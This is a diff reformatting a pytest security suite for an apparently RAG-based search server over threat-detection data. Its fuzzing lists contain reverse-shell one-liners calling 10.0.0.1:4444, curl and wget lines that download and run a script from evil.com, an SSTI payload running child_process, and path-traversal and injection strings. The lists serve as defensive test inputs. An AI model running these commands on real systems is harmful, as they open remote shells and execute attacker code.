@@ -11,16 +11,14 @@ import asyncio
 import random
 import string
 import sys
-import time
 from pathlib import Path
-from typing import Any
 
 import pytest
 
 sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
 
-from rag_mcp.index import RAGIndex, ALLOWED_MODELS
-from rag_mcp.server import RAGServer, MAX_QUERY_LENGTH, MAX_FILTER_LENGTH, MAX_TOP_K
+from rag_mcp.index import ALLOWED_MODELS, RAGIndex
+from rag_mcp.server import MAX_FILTER_LENGTH, MAX_QUERY_LENGTH
 
 # Fixtures (rag_index, rag_server) provided by conftest.py
 
@@ -109,7 +107,7 @@ EXTENDED_COMMAND_INJECTION = [
     "`/bin/sh`",
     "$(/bin/sh)",
     ";bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-    ";python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    ';python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
     ";nc -e /bin/sh 10.0.0.1 4444",
     ";wget http://evil.com/shell.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh",
     ";curl http://evil.com/shell.sh | sh",
@@ -154,7 +152,7 @@ SSTI_INJECTION = [
     "${{7*7}}",
     "*{7*7}",
     "@(1+2)",
-    "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+    '{{constructor.constructor(\'return this.process.mainModule.require("child_process").execSync("id")\')()}}',
 ]
 
 # Log injection / CRLF injection
@@ -276,35 +274,30 @@ EXTENDED_UNICODE = [
     "ⲣassword",  # Coptic Small Letter Ro
     "ｐａｓｓｗｏｒｄ",  # Fullwidth
     "ＰＡＳＳＷＯＲＤ",  # Fullwidth caps
-
     # Unicode normalization attacks
     "ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕",  # Mathematical double-struck
     "𝓹𝓪𝓼𝓼𝔀𝓸𝓻𝓭",  # Mathematical script
     "𝖕𝖆𝖘𝖘𝖜𝖔𝖗𝖉",  # Mathematical fraktur
     "𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱",  # Mathematical sans-serif
     "𝙥𝙖𝙨𝙨𝙬𝙤𝙧𝙙",  # Mathematical sans-serif italic
-
     # Direction override
     "\u202ecredential\u202c",  # Right-to-left override
     "\u202dcredential\u202c",  # Left-to-right override
     "\u2066credential\u2069",  # Left-to-right isolate
     "\u2067credential\u2069",  # Right-to-left isolate
-
     # Invisible characters
     "cre\u200bdential",  # Zero-width space
     "cre\u200cdential",  # Zero-width non-joiner
     "cre\u200ddential",  # Zero-width joiner
-    "cre\ufeffential",   # Zero-width no-break space (BOM)
+    "cre\ufeffential",  # Zero-width no-break space (BOM)
     "cre\u2060dential",  # Word joiner
     "cre\u180edential",  # Mongolian vowel separator
-
     # Combining characters
     "c\u0327redential",  # Combining cedilla
     "c\u0308redential",  # Combining diaeresis
     "cre\u0300dential",  # Combining grave
     "cre\u0301dential",  # Combining acute
     "cre\u0302dential",  # Combining circumflex
-
     # Confusable characters
     "credentiaI",  # Capital I instead of lowercase l
     "credentia1",  # Number 1 instead of lowercase l
@@ -314,23 +307,19 @@ EXTENDED_UNICODE = [
     "cr3dential",  # Number 3 for e
     "credentia|",  # Pipe for l
     "credenti@l",  # @ for a
-
     # Line terminators
     "credential\u2028",  # Line separator
     "credential\u2029",  # Paragraph separator
-
     # Other special
     "credential\u00a0",  # Non-breaking space
     "credential\u202f",  # Narrow no-break space
     "credential\u205f",  # Medium mathematical space
     "credential\u3000",  # Ideographic space
-
     # Mixed scripts
     "сredential",  # Cyrillic 'с'
     "сrеdеntiаl",  # Multiple Cyrillic
     "ćredential",  # Latin small c with acute
     "çredential",  # Latin small c with cedilla
-
     # Emoji variations
     "🔐credential",
     "credential🔐",
@@ -376,6 +365,7 @@ class TestExtendedUnicode:
 # Extended Boundary Tests (50+)
 # =============================================================================
 
+
 class TestExtendedBoundary:
     """Extended boundary condition tests."""
 
@@ -392,7 +382,7 @@ class TestExtendedBoundary:
         result = rag_index.search("credential", top_k=top_k)
         assert len(result["results"]) <= top_k
 
-    @pytest.mark.parametrize("top_k", [51, 100, 1000, 10000, 2**31-1])
+    @pytest.mark.parametrize("top_k", [51, 100, 1000, 10000, 2**31 - 1])
     def test_top_k_over_max(self, rag_index, top_k):
         """top_k over maximum should be clamped."""
         result = rag_index.search("credential", top_k=top_k)
@@ -437,47 +427,81 @@ class TestExtendedBoundary:
 # Extended Filter Tests (50+)
 # =============================================================================
 
+
 class TestExtendedFilters:
     """Extended filter tests."""
 
-    @pytest.mark.parametrize("source", [
-        "sigma", "SIGMA", "SiGmA",  # Case variations
-        "sigma_rules", "sigma_rules_rag",  # Partial matches
-        "sig", "igma",  # Substrings
-        "sigma'--", "sigma; DROP",  # Injection attempts
-        "sigma%", "sigma*", "sigma?",  # Wildcards
-        "sigma\x00", "sigma\n",  # Special chars
-        "", " ", "  ",  # Empty/whitespace
-        "a" * MAX_FILTER_LENGTH,  # Max length
-    ])
+    @pytest.mark.parametrize(
+        "source",
+        [
+            "sigma",
+            "SIGMA",
+            "SiGmA",  # Case variations
+            "sigma_rules",
+            "sigma_rules_rag",  # Partial matches
+            "sig",
+            "igma",  # Substrings
+            "sigma'--",
+            "sigma; DROP",  # Injection attempts
+            "sigma%",
+            "sigma*",
+            "sigma?",  # Wildcards
+            "sigma\x00",
+            "sigma\n",  # Special chars
+            "",
+            " ",
+            "  ",  # Empty/whitespace
+            "a" * MAX_FILTER_LENGTH,  # Max length
+        ],
+    )
     def test_source_filter_variants(self, rag_index, source):
         """Various source filter values."""
         result = rag_index.search("credential", source=source, top_k=3)
         assert "results" in result
 
-    @pytest.mark.parametrize("technique", [
-        "T1003", "t1003", "T1003.001",  # Standard
-        "T1003.001.001",  # Invalid format
-        "TXXX",  # Invalid ID
-        "T9999",  # Non-existent
-        "T1003'--", "T1003; DROP",  # Injection
-        "",  # Empty
-        "T1003" * 10,  # Repeated
-    ])
+    @pytest.mark.parametrize(
+        "technique",
+        [
+            "T1003",
+            "t1003",
+            "T1003.001",  # Standard
+            "T1003.001.001",  # Invalid format
+            "TXXX",  # Invalid ID
+            "T9999",  # Non-existent
+            "T1003'--",
+            "T1003; DROP",  # Injection
+            "",  # Empty
+            "T1003" * 10,  # Repeated
+        ],
+    )
     def test_technique_filter_variants(self, rag_index, technique):
         """Various technique filter values."""
         result = rag_index.search("credential", technique=technique, top_k=3)
         assert "results" in result
 
-    @pytest.mark.parametrize("platform", [
-        "windows", "WINDOWS", "Windows", "WiNdOwS",  # Case
-        "linux", "LINUX", "Linux",
-        "macos", "macOS", "MacOS", "MACOS",
-        "ios", "android", "cloud",  # Other platforms
-        "windows,linux", "windows|linux",  # Multiple
-        "windows'--",  # Injection
-        "",  # Empty
-    ])
+    @pytest.mark.parametrize(
+        "platform",
+        [
+            "windows",
+            "WINDOWS",
+            "Windows",
+            "WiNdOwS",  # Case
+            "linux",
+            "LINUX",
+            "Linux",
+            "macos",
+            "macOS",
+            "MacOS",
+            "MACOS",
+            "ios",
+            "android",
+            "cloud",  # Other platforms
+            "windows,linux",
+            "windows|linux",  # Multiple
+            "windows'--",  # Injection
+            "",  # Empty
+        ],
+    )
     def test_platform_filter_variants(self, rag_index, platform):
         """Various platform filter values."""
         result = rag_index.search("credential", platform=platform, top_k=3)
@@ -486,11 +510,7 @@ class TestExtendedFilters:
     def test_all_filters_combined(self, rag_index):
         """All filters at once."""
         result = rag_index.search(
-            "credential",
-            source="sigma",
-            technique="T1003",
-            platform="windows",
-            top_k=5
+            "credential", source="sigma", technique="T1003", platform="windows", top_k=5
         )
         assert "results" in result
 
@@ -498,10 +518,7 @@ class TestExtendedFilters:
         """Filters that conflict."""
         # Linux tool filtered to Windows
         result = rag_index.search(
-            "bash shell",
-            source="gtfobins",
-            platform="windows",
-            top_k=5
+            "bash shell", source="gtfobins", platform="windows", top_k=5
         )
         assert "results" in result
 
@@ -509,6 +526,7 @@ class TestExtendedFilters:
 # =============================================================================
 # Stress and Performance Tests (50+)
 # =============================================================================
+
 
 class TestStress:
     """Stress and performance tests."""
@@ -535,9 +553,16 @@ class TestStress:
 
         threads = []
         queries = [
-            "credential", "lateral movement", "persistence",
-            "powershell", "mimikatz", "ransomware",
-            "detection", "forensics", "T1003", "event log"
+            "credential",
+            "lateral movement",
+            "persistence",
+            "powershell",
+            "mimikatz",
+            "ransomware",
+            "detection",
+            "forensics",
+            "T1003",
+            "event log",
         ]
 
         for i in range(50):
@@ -560,7 +585,7 @@ class TestStress:
     def test_memory_stability(self, rag_index):
         """Run many queries to check memory stability."""
         for _ in range(200):
-            query = ''.join(random.choices(string.ascii_lowercase, k=20))
+            query = "".join(random.choices(string.ascii_lowercase, k=20))
             result = rag_index.search(query, top_k=5)
             assert "results" in result
 
@@ -568,6 +593,7 @@ class TestStress:
 # =============================================================================
 # Server Error Handling Tests (50+)
 # =============================================================================
+
 
 class TestServerErrors:
     """Server error handling tests."""
@@ -589,14 +615,17 @@ class TestServerErrors:
         except ValueError:
             pass
 
-    @pytest.mark.parametrize("args", [
-        {"query": None},
-        {"query": 123},
-        {"query": []},
-        {"query": {}},
-        {"query": True},
-        {"query": False},
-    ])
+    @pytest.mark.parametrize(
+        "args",
+        [
+            {"query": None},
+            {"query": 123},
+            {"query": []},
+            {"query": {}},
+            {"query": True},
+            {"query": False},
+        ],
+    )
     def test_invalid_query_types(self, rag_server, args):
         """Invalid query argument types."""
         try:
@@ -605,24 +634,30 @@ class TestServerErrors:
         except (ValueError, TypeError, AttributeError):
             pass
 
-    @pytest.mark.parametrize("args", [
-        {"query": "test", "top_k": "five"},
-        {"query": "test", "top_k": []},
-        {"query": "test", "top_k": {}},
-        {"query": "test", "top_k": None},
-    ])
+    @pytest.mark.parametrize(
+        "args",
+        [
+            {"query": "test", "top_k": "five"},
+            {"query": "test", "top_k": []},
+            {"query": "test", "top_k": {}},
+            {"query": "test", "top_k": None},
+        ],
+    )
     def test_invalid_top_k_types(self, rag_server, args):
         """Invalid top_k types."""
         result = self.run_async(rag_server._search(args))
         # Should handle gracefully
         assert "results" in result
 
-    @pytest.mark.parametrize("args", [
-        {"query": "test", "source": 123},
-        {"query": "test", "source": []},
-        {"query": "test", "technique": 123},
-        {"query": "test", "platform": 123},
-    ])
+    @pytest.mark.parametrize(
+        "args",
+        [
+            {"query": "test", "source": 123},
+            {"query": "test", "source": []},
+            {"query": "test", "technique": 123},
+            {"query": "test", "platform": 123},
+        ],
+    )
     def test_invalid_filter_types(self, rag_server, args):
         """Invalid filter argument types."""
         try:
@@ -635,6 +670,7 @@ class TestServerErrors:
 # =============================================================================
 # Model and Configuration Tests
 # =============================================================================
+
 
 class TestConfiguration:
     """Configuration and model tests."""
@@ -651,17 +687,21 @@ class TestConfiguration:
     def test_default_model_in_allowlist(self):
         """Default model is in allowlist."""
         from rag_mcp.index import DEFAULT_MODEL_NAME
+
         assert DEFAULT_MODEL_NAME in ALLOWED_MODELS
 
-    @pytest.mark.parametrize("model", [
-        "invalid",
-        "/invalid",
-        "invalid/",
-        "../../../etc/passwd",
-        "http://evil.com/model",
-        "file:///etc/passwd",
-        "';alert(1);//",
-    ])
+    @pytest.mark.parametrize(
+        "model",
+        [
+            "invalid",
+            "/invalid",
+            "invalid/",
+            "../../../etc/passwd",
+            "http://evil.com/model",
+            "file:///etc/passwd",
+            "';alert(1);//",
+        ],
+    )
     def test_invalid_model_names(self, model):
         """Invalid model names should be rejected."""
         idx = RAGIndex(model_name=model)
